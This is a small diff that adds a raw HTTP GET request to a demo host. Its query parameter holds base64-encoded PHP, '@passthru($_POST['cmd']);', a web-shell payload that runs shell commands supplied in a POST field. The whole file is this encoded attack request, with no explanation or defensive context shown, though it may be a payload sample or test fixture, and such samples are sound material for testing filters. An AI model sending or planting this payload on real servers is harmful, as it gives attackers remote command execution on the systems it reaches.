@@ -1,0 +1,4 @@
+GET /a?q=QHBhc3N0aHJ1KCRfUE9TVFsnY21kJ10pOw%3D%3D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
